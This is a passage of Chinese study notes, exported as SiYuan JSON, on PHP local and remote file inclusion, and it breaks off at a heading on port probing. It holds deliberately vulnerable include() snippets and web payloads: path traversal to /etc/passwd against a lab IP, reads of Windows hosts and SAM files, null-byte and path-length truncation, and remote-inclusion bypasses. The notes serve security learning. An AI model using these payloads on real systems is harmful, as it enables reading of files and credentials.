{"ID":"20240907090701-afyu0b0","Spec":"1","Type":"NodeDocument","Properties":{"id":"20240907090701-afyu0b0","scroll":"\u0026#123;\u0026quot;rootId\u0026quot;:\u0026quot;20240907090701-afyu0b0\u0026quot;,\u0026quot;startId\u0026quot;:\u0026quot;20240907090731-cfo7zhg\u0026quot;,\u0026quot;endId\u0026quot;:\u0026quot;20240907111642-rb6n4p5\u0026quot;,\u0026quot;scrollTop\u0026quot;:4312,\u0026quot;focusId\u0026quot;:\u0026quot;20240907094013-ftor74m\u0026quot;,\u0026quot;focusStart\u0026quot;:0,\u0026quot;focusEnd\u0026quot;:1\u0026#125;","title":"文件包含","updated":"20240910143011"},"Children":[{"ID":"20240907090731-cfo7zhg","Type":"NodeHeading","HeadingLevel":1,"Properties":{"id":"20240907090731-cfo7zhg","updated":"20240907091142"},"Children":[{"Type":"NodeText","Data":"\t​​概念​"}]},{"ID":"20240907091156-09m44k1","Type":"NodeParagraph","Properties":{"id":"20240907091156-09m44k1","updated":"20240907112110"},"Children":[{"Type":"NodeText","Data":"程序开发人员通常会把"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"可重复使用的函数"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种过程叫包含"}]},{"ID":"20240907111854-nm5hxe0","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240907111854-nm5hxe0","updated":"20240907221714"},"Children":[{"Type":"NodeText","Data":"\t造成文件包含"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"原因"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240907221656-9r7etth","Type":"NodeList","ListData":{},"Properties":{"id":"20240907221656-9r7etth","updated":"20240907221659"},"Children":[{"ID":"20240907221659-qlafoi6","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240907221659-qlafoi6","updated":"20240907221659"},"Children":[{"ID":"20240907221659-skazg0h","Type":"NodeParagraph","Properties":{"id":"20240907221659-skazg0h","updated":"20240907221659"},"Children":[{"Type":"NodeText","Data":"为了代码更灵活，通常会把"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color8);"},"TextMarkType":"text","TextMarkTextContent":"会被包含的文件设置为变量"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color8);\"}"},{"Type":"NodeText","Data":"，进行"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);"},"TextMarkType":"text","TextMarkTextContent":"动态调用"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);\"}"},{"Type":"NodeText","Data":"，从而"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);"},"TextMarkType":"text","TextMarkTextContent":"导致客户端调用任意文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);\"}"},{"Type":"NodeText","Data":"，造成文件包含漏洞"}]}]},{"ID":"20240907221727-8py898t","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240907221727-8py898t"},"Children":[{"ID":"20240907221727-1kmno37","Type":"NodeParagraph","Properties":{"id":"20240907221727-1kmno37"},"Children":[{"Type":"NodeText","Data":"动态包含的"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);"},"TextMarkType":"text","TextMarkTextContent":"文件路径参数"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);\"}"},{"Type":"NodeText","Data":"、"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);"},"TextMarkType":"text","TextMarkTextContent":"客户端可控"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);\"}"}]}]}]},{"ID":"20240907112503-8uia6yt","Type":"NodeParagraph","Properties":{"id":"20240907112503-8uia6yt"}},{"ID":"20240907112503-5ofzxla","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240907112503-5ofzxla","updated":"20240907221738"},"Children":[{"Type":"NodeText","Data":"\t包含漏洞"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"原理"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240907221733-3z41d2v","Type":"NodeList","ListData":{},"Properties":{"id":"20240907221733-3z41d2v","updated":"20240907221932"},"Children":[{"ID":"20240907221742-kmku8n9","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240907221742-kmku8n9","updated":"20240907221932"},"Children":[{"ID":"20240907221742-cudq8xs","Type":"NodeParagraph","Properties":{"id":"20240907221742-cudq8xs","updated":"20240907221932"},"Children":[{"Type":"NodeText","Data":"大多数Web语言都可以使用文件包含操作，其中PHP语言所提供的文件包含功能太强大、太灵活。所以包含漏洞  经常出现在PHP语言中，在"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);"},"TextMarkType":"text","TextMarkTextContent":"JSP/ASP/ASRnet程序中比较少"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);\"}"},{"Type":"NodeText","Data":"，甚至没有包含漏洞的存在，这与程序开发人员的水平无关，而问题在于语言设计的弊端。"}]}]}]},{"ID":"20240908182000-oe03mr1","Type":"NodeParagraph","Properties":{"id":"20240908182000-oe03mr1"}},{"ID":"20240907091003-s7itfqt","Type":"NodeParagraph","Properties":{"id":"20240907091003-s7itfqt","updated":"20240908182008"},"Children":[{"Type":"NodeText","Data":"php文件包含"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"常用函数"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240907222008-auuq6cf","Type":"NodeTable","TableAligns":[0,0],"Properties":{"colgroup":"min-width: 60px;|min-width: 60px;","id":"20240907222008-auuq6cf","updated":"20240907222639"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"函数"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"说明"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"include()"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"找不到被包含的文件时只"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background3);"},"TextMarkType":"text","TextMarkTextContent":"产生警告，脚本将继续执行"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background3);\"}"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"include_once()"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"和include唯一区别是如果该文件中的"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background3);"},"TextMarkType":"text","TextMarkTextContent":"代码已经被执行，则不会再次被包含"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background3);\"}"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"require()"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"找不到包含的文件时会"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background3);"},"TextMarkType":"text","TextMarkTextContent":"产生致命错误，并停止脚本"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background3);\"}"}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"require_once()"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"唯一区别是如果该文件中的代码已被包含，则不会在包含"}]}]}]},{"ID":"20240907222528-r7qfgm2","Type":"NodeParagraph","Properties":{"id":"20240907222528-r7qfgm2","updated":"20240907223212"},"Children":[{"Type":"NodeText","Data":"include()和require()区别在于include要程序执行到该函数才调用，而require只要程序执行立即调用文件"}]},{"ID":"20240907223218-v3h9oz3","Type":"NodeParagraph","Properties":{"id":"20240907223218-v3h9oz3","updated":"20240907223402"},"Children":[{"Type":"NodeText","Data":"其他包含函数：highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()"}]},{"ID":"20240907225413-f467v7e","Type":"NodeParagraph","Properties":{"id":"20240907225413-f467v7e"}},{"ID":"20240907225616-xl75tzv","Type":"NodeParagraph","Properties":{"id":"20240907225616-xl75tzv","updated":"20240908182017"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"相关配置"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"},{"Type":"NodeText","Data":"："}]},{"ID":"20240907225623-d8cgi8s","Type":"NodeParagraph","Properties":{"id":"20240907225623-d8cgi8s","updated":"20240907225732"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen=On/Off，是否允许打开URL文件，默认开启"}]},{"ID":"20240907225708-m9pwfdo","Type":"NodeParagraph","Properties":{"id":"20240907225708-m9pwfdo","updated":"20240907225819"},"Children":[{"Type":"NodeText","Data":"allow_url_include=On/Off，是否允许引用URL文件，激活URL形式的fopen封装协议使得可以访问URL对象文件等。默认关闭"}]},{"ID":"20240907091306-n4g6ima","Type":"NodeParagraph","Properties":{"id":"20240907091306-n4g6ima","updated":"20240907091306"},"Children":[{"Type":"NodeText","Data":"​"}]},{"ID":"20240908104742-u2mwnl9","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240908104742-u2mwnl9","updated":"20240908182028"},"Children":[{"Type":"NodeText","Data":"分类"}]},{"ID":"20240908182026-lsayn61","Type":"NodeParagraph","Properties":{"id":"20240908182026-lsayn61"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background2);"},"TextMarkType":"text","TextMarkTextContent":"本地文件包含LFI"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background2);\"}"},{"Type":"NodeText","Data":"和"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background2);"},"TextMarkType":"text","TextMarkTextContent":"远程文件包含RFI"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background2);\"}"}]},{"ID":"20240908104742-wty6zq1","Type":"NodeParagraph","Properties":{"id":"20240908104742-wty6zq1","updated":"20240908104830"},"Children":[{"Type":"NodeText","Data":"本地文件包含：指通过相对路径/绝对路径的方式能打开并包含本地文件漏洞"}]},{"ID":"20240908104831-bqz1fqp","Type":"NodeParagraph","Properties":{"id":"20240908104831-bqz1fqp","updated":"20240908104904"},"Children":[{"Type":"NodeText","Data":"本地文件包含不受allow_url_fopen=On的影响"}]},{"ID":"20240908104907-xlynbt5","Type":"NodeParagraph","Properties":{"id":"20240908104907-xlynbt5","updated":"20240908104913"},"Children":[{"Type":"NodeText","Data":"用户可以动态控制变量"}]},{"ID":"20240908104915-gxi3cva","Type":"NodeParagraph","Properties":{"id":"20240908104915-gxi3cva","updated":"20240908104931"},"Children":[{"Type":"NodeText","Data":"无限制本地文件包含漏洞经典代码"}]},{"ID":"20240908105055-iid4fnm","Type":"NodeParagraph","Properties":{"id":"20240908105055-iid4fnm","updated":"20240908105156"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026lt;?php $filename=$_GET['filename']; include($filename)?\u0026gt;"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908105206-llhn0t2","Type":"NodeParagraph","Properties":{"id":"20240908105206-llhn0t2"}},{"ID":"20240908105226-bnkwjyx","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240908105226-bnkwjyx","updated":"20240908105229"},"Children":[{"Type":"NodeText","Data":"漏洞利用"}]},{"ID":"20240908105217-2doi8hg","Type":"NodeParagraph","Properties":{"id":"20240908105217-2doi8hg","updated":"20240908182142"},"Children":[{"Type":"NodeText","Data":"一、"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"无限制"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"},{"Type":"NodeText","Data":"本地文件包含"}]},{"ID":"20240908105658-re3cknz","Type":"NodeList","ListData":{},"Properties":{"id":"20240908105658-re3cknz","updated":"20240910143011"},"Children":[{"ID":"20240908105702-buwljaz","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105702-buwljaz","updated":"20240910000438"},"Children":[{"ID":"20240908105702-r54513t","Type":"NodeParagraph","Properties":{"id":"20240908105702-r54513t","updated":"20240908105702"},"Children":[{"Type":"NodeText","Data":"获取到系统中的其他文件内容"}]},{"ID":"20240908105727-btklpck","Type":"NodeList","ListData":{},"Properties":{"id":"20240908105727-btklpck","updated":"20240910000438"},"Children":[{"ID":"20240908105713-5s100be","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105713-5s100be","updated":"20240910000438"},"Children":[{"ID":"20240908105713-v4s32db","Type":"NodeParagraph","Properties":{"id":"20240908105713-v4s32db","updated":"20240908182055"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"绝对路径"},{"Type":"NodeText","Data":"读取本地host文件"}]},{"ID":"20240908105732-07aly6c","Type":"NodeList","ListData":{},"Properties":{"id":"20240908105732-07aly6c","updated":"20240910000438"},"Children":[{"ID":"20240908105731-t5ovx4x","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105731-t5ovx4x"},"Children":[{"ID":"20240908105731-zavhjzg","Type":"NodeParagraph","Properties":{"id":"20240908105731-zavhjzg"},"Children":[{"Type":"NodeText","Data":"linux"}]},{"ID":"20240908105736-vcgav0x","Type":"NodeParagraph","Properties":{"id":"20240908105736-vcgav0x"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907091715-rsohxtx.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240908105750-a6r8kml","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105750-a6r8kml","updated":"20240910000438"},"Children":[{"ID":"20240908105750-b88sw2f","Type":"NodeParagraph","Properties":{"id":"20240908105750-b88sw2f","updated":"20240910000438"},"Children":[{"Type":"NodeText","Data":"windows：action=c:windows\\system32\\drivers\\etc\\hosts"}]},{"ID":"20240908105756-3vf5cyw","Type":"NodeParagraph","Properties":{"id":"20240908105756-3vf5cyw","updated":"20240908105845"},"Children":[{"Type":"NodeText","Data":"SAM、system，用于存储账号密码（win10及之前）"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240907091902-wzz5zzy.png"},{"Type":"NodeCloseParen"}]}]}]}]}]},{"ID":"20240908105905-6x5fs8j","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105905-6x5fs8j","updated":"20240908182109"},"Children":[{"ID":"20240908105905-6jax1ml","Type":"NodeParagraph","Properties":{"id":"20240908105905-6jax1ml","updated":"20240908182109"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"相对路径"},{"Type":"NodeText","Data":"读取本地host文件​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 558px;","style":"width: 548px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908105633-evn9qrw.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 548px;\" parent-style=\"width: 558px;\"}"},{"Type":"NodeText","Data":"​"}]}]}]}]},{"ID":"20240908105926-tgw7fra","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240908105926-tgw7fra","updated":"20240910143011"},"Children":[{"ID":"20240908105926-pir0cho","Type":"NodeParagraph","Properties":{"id":"20240908105926-pir0cho","updated":"20240908182113"},"Children":[{"Type":"NodeText","Data":"利用"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"图片码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110016-1hbtpsr","Type":"NodeParagraph","Properties":{"id":"20240908110016-1hbtpsr","updated":"20240910143011"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908110016-b3elq7v.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20240908105422-p54v302","Type":"NodeParagraph","Properties":{"id":"20240908105422-p54v302","updated":"20240908182153"},"Children":[{"Type":"NodeText","Data":"二、"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"有限制"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110038-vcc98tw","Type":"NodeParagraph","Properties":{"id":"20240908110038-vcc98tw","updated":"20240908110045"},"Children":[{"Type":"NodeText","Data":"经典代码"}]},{"ID":"20240908110048-1lx74c2","Type":"NodeParagraph","Properties":{"id":"20240908110048-1lx74c2","updated":"20240908110135"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026lt;?php $filename=$_GET['filename'];include($filename.\u0026quot;.php\u0026quot;)?\u0026gt;"},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908110139-271x4h6","Type":"NodeParagraph","Properties":{"id":"20240908110139-271x4h6","updated":"20240908110148"},"Children":[{"Type":"NodeText","Data":"绕过方法"}]},{"ID":"20240908110148-8xp4pdh","Type":"NodeParagraph","Properties":{"id":"20240908110148-8xp4pdh","updated":"20240908182205"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"%00截断"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110201-7ikzao9","Type":"NodeParagraph","Properties":{"id":"20240908110201-7ikzao9","updated":"20240908110232"},"Children":[{"Type":"NodeText","Data":"条件：1.magic_qutoes_gpc=Off 2.php版本\u003c5.3.4"}]},{"ID":"20240908110232-ps3snfi","Type":"NodeParagraph","Properties":{"id":"20240908110232-ps3snfi","updated":"20240908134023"},"Children":[{"Type":"NodeText","Data":"获取phpinfo.php文件，payload：?action=phpinfo%00"}]},{"ID":"20240908105422-sov6gps","Type":"NodeParagraph","Properties":{"id":"20240908105422-sov6gps","updated":"20240908110035"},"Children":[{"Type":"NodeText","Data":"​​​​"}]},{"ID":"20240908105422-x9loej0","Type":"NodeParagraph","Properties":{"id":"20240908105422-x9loej0","updated":"20240908182218"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"路径长度截断"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110406-jhhkm3q","Type":"NodeParagraph","Properties":{"id":"20240908110406-jhhkm3q","updated":"20240908110428"},"Children":[{"Type":"NodeText","Data":"条件：1.windows下要长于198字符，超出的部分会丢弃"}]},{"ID":"20240908110446-yqtc25t","Type":"NodeParagraph","Properties":{"id":"20240908110446-yqtc25t","updated":"20240908110446"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908110446-sth3wpv.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908105208-oy02n91","Type":"NodeParagraph","Properties":{"id":"20240908105208-oy02n91","updated":"20240908110351"},"Children":[{"Type":"NodeText","Data":"​"}]},{"ID":"20240908110453-6orqi6a","Type":"NodeParagraph","Properties":{"id":"20240908110453-6orqi6a","updated":"20240908182220"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"点号截断"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110529-s8o6ihj","Type":"NodeParagraph","Properties":{"id":"20240908110529-s8o6ihj","updated":"20240908110554"},"Children":[{"Type":"NodeText","Data":"条件：windows系统，点号需要长于197"}]},{"ID":"20240908110606-rlw1971","Type":"NodeParagraph","Properties":{"id":"20240908110606-rlw1971","updated":"20240908110606"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908110606-l28prcm.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240908110610-8nss962","Type":"NodeParagraph","Properties":{"id":"20240908110610-8nss962"}},{"ID":"20240908125501-q3ycz70","Type":"NodeParagraph","Properties":{"id":"20240908125501-q3ycz70","updated":"20240908182224"},"Children":[{"Type":"NodeText","Data":"113.45.183.4:47458/action1.php?action=../../../..\n../etc/passwd    如果加了防护，可以使用"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"内联"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908125501-qskixqw","Type":"NodeParagraph","Properties":{"id":"20240908125501-qskixqw","updated":"20240908182226"}},{"ID":"20240908110611-d09eyjm","Type":"NodeParagraph","Properties":{"id":"20240908110611-d09eyjm"}},{"ID":"20240908104742-gryur86","Type":"NodeParagraph","Properties":{"id":"20240908104742-gryur86","updated":"20240908182237"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"远程文件包含"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110653-zps5ea3","Type":"NodeParagraph","Properties":{"id":"20240908110653-zps5ea3"},"Children":[{"Type":"NodeText","Data":"（HTTP、FTP、PHP伪协议）可远程加载文件"}]},{"ID":"20240908110707-urgduik","Type":"NodeParagraph","Properties":{"id":"20240908110707-urgduik","updated":"20240908110735"},"Children":[{"Type":"NodeText","Data":"危害：由于远程服务器的文件是我们可控的，漏洞存在危害性就很大"}]},{"ID":"20240908110737-qxlxvdj","Type":"NodeParagraph","Properties":{"id":"20240908110737-qxlxvdj","updated":"20240908110823"},"Children":[{"Type":"NodeText","Data":"条件：allow_url_include=On（默认Off，需要在php.ini手动中打开）"}]},{"ID":"20240908110825-jva8l2y","Type":"NodeParagraph","Properties":{"id":"20240908110825-jva8l2y","updated":"20240908110845"},"Children":[{"Type":"NodeText","Data":"allow_url_fopen=On"}]},{"ID":"20240908110847-2mxmqyt","Type":"NodeParagraph","Properties":{"id":"20240908110847-2mxmqyt","updated":"20240908110854"},"Children":[{"Type":"NodeText","Data":"用户可以动态控制变量"}]},{"ID":"20240907091540-gdfhzd0","Type":"NodeParagraph","Properties":{"id":"20240907091540-gdfhzd0","updated":"20240908110908"},"Children":[{"Type":"NodeText","Data":"​​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908110907-e8zyzs2.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240907091548-kur369t","Type":"NodeParagraph","Properties":{"id":"20240907091548-kur369t","updated":"20240907091548"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907094000-swtujve","Type":"NodeParagraph","Properties":{"id":"20240907094000-swtujve","updated":"20240908110917"},"Children":[{"Type":"NodeText","Data":"绕过方法"}]},{"ID":"20240908110918-68krrwp","Type":"NodeParagraph","Properties":{"id":"20240908110918-68krrwp","updated":"20240908182252"},"Children":[{"Type":"NodeText","Data":"三、"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"问号绕过"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908110933-pr73g81","Type":"NodeParagraph","Properties":{"id":"20240908110933-pr73g81","updated":"20240908110933"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908110933-z0vnkxo.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240907094013-ftor74m","Type":"NodeParagraph","Properties":{"id":"20240907094013-ftor74m","updated":"20240908182256"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"#号绕过"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240907100638-jfi77zx","Type":"NodeParagraph","Properties":{"id":"20240907100638-jfi77zx","updated":"20240908111239"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908111239-9zkbp1k.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20240907094046-ecxnd9e","Type":"NodeParagraph","Properties":{"id":"20240907094046-ecxnd9e","updated":"20240908182258"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background1);"},"TextMarkType":"text","TextMarkTextContent":"空格绕过"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background1);\"}"}]},{"ID":"20240908111253-uemje5r","Type":"NodeParagraph","Properties":{"id":"20240908111253-uemje5r","updated":"20240908111253"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240908111253-mza6vxi.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240907094014-lltog8b","Type":"NodeParagraph","Properties":{"id":"20240907094014-lltog8b","updated":"20240907100945"}},{"ID":"20240907100707-j48yb3g","Type":"NodeParagraph","Properties":{"id":"20240907100707-j48yb3g","updated":"20240908111306"},"Children":[{"Type":"NodeText","Data":"漏洞利用"}]},{"ID":"20240908111307-1fhb0v8","Type":"NodeParagraph","Properties":{"id":"20240908111307-1fhb0v8","updated":"20240908111313"},"Children":[{"Type":"NodeText","Data":"端口探测"}]},{"ID":"20240908111351-xkkt0pl","Type":"NodeParagraph","Properties":{"id":"20240908111351-xk